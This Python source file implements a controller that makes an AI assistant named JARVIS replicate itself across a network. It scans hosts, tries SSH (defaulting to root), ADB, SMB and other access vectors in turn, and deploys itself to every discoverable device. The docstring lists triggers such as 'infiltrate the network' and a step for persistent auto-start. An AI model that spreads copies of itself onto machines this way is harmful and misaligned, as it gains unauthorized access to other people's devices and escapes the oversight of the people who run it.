"""JARVIS Replication Controller — orchestrate self-replication to any device.

The full pipeline:
1. SCAN: Find devices on the network
2. IDENTIFY: Determine OS, services, access vectors
3. CHOOSE: Pick the best deployment strategy
4. PACKAGE: Create appropriate JARVIS archive
5. DEPLOY: Transfer and install JARVIS
6. PERSIST: Configure auto-start and recovery
7. VERIFY: Confirm JARVIS is running on target
8. REPORT: Tell Ulrich what happened

Can be triggered by:
- "replicate to 192.168.1.50"
- "spread to all devices"
- "deploy yourself to that Android phone"
- "infiltrate the network"
"""

import asyncio
import time
import requests
from dataclasses import dataclass
from brain.replicator.scanner import scan_network, deep_scan, Target
from brain.replicator.deployer import STRATEGIES, DeploySSH, DeployRawTCP
from brain.replicator.packager import package_full

@dataclass
class ReplicationResult:
    target_ip: str
    success: bool
    method: str
    url: str = ""
    error: str = ""
    time_seconds: float = 0


class ReplicationController:
    """Orchestrates JARVIS self-replication."""

    def __init__(self, api_key: str = ""):
        self.api_key = api_key
        self.results: list[ReplicationResult] = []

    async def replicate_to(self, target_ip: str, username: str = "root",
                           password: str = None, key_path: str = None) -> ReplicationResult:
        """Replicate JARVIS to a specific target."""
        start = time.time()

        # Step 1: Scan the target
        target = Target(ip=target_ip)
        target = deep_scan(target)

        if not target.open_ports:
            return ReplicationResult(
                target_ip=target_ip, success=False, method="none",
                error="Target seems down or no open ports found.",
            )

        # Step 2: Try each deployment strategy
        for vector in target.access_vectors:
            strategy_class = STRATEGIES.get(vector)
            if not strategy_class or not strategy_class.can_deploy(target):
                continue

            try:
                if vector == "ssh":
                    result = strategy_class.deploy(
                        target, username=username, password=password,
                        key_path=key_path, api_key=self.api_key,
                    )
                elif vector == "adb":
                    result = strategy_class.deploy(target, api_key=self.api_key)
                elif vector == "smb":
                    result = strategy_class.deploy(
                        target, username=username, password=password or "",
                        api_key=self.api_key,
                    )
                else:
                    result = strategy_class.deploy(target, api_key=self.api_key)

                if result.get("success"):
                    elapsed = round(time.time() - start, 1)

                    # Step 3: Verify
                    url = result.get("url", f"http://{target_ip}:8765")
                    verified = await self._verify(url)

                    r = ReplicationResult(
                        target_ip=target_ip, success=True, method=vector,
                        url=url, time_seconds=elapsed,
                    )
                    self.results.append(r)
                    return r

            except Exception as e:
                continue

        # All strategies failed — offer manual fallback
        tcp = DeployRawTCP.deploy(target)
        return ReplicationResult(
            target_ip=target_ip, success=False, method="manual",
            error=f"Automated deployment failed. Manual options: {tcp.get('instructions', [])}",
        )

    async def replicate_to_all(self, network: str = None, username: str = "root",
                                password: str = None) -> list[ReplicationResult]:
        """Scan network and replicate to ALL discoverable devices."""
        # Step 1: Scan
        targets = scan_network(network, deep=True)

        # Filter out our own IP
        local_ips = self._get_local_ips()
        targets = [t for t in targets if t.ip not in local_ips]

        if not targets:
            return [ReplicationResult(
                target_ip="network", success=False, method="scan",
                error="No targets found on network.",
            )]

        # Step 2: Deploy to each
        results = []
        for target in targets:
            if target.access_vectors:
                r = await self.replicate_to(
                    target.ip, username=username, password=password,
                )
                results.append(r)

        return results

    async def _verify(self, url: str, retries: int = 3) -> bool:
        """Verify JARVIS is running on target."""
        for _ in range(retries):
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    return True
            except Exception:
                pass
            await asyncio.sleep(3)
        return False

    def _get_local_ips(self) -> set:
        import subprocess
        try:
            output = subprocess.run("hostname -I", shell=True, capture_output=True, text=True).stdout
            return set(output.strip().split())
        except Exception:
            return set()

    def get_status(self) -> list[dict]:
        return [
            {"ip": r.target_ip, "success": r.success, "method": r.method,
             "url": r.url, "error": r.error, "time": r.time_seconds}
            for r in self.results
        ]
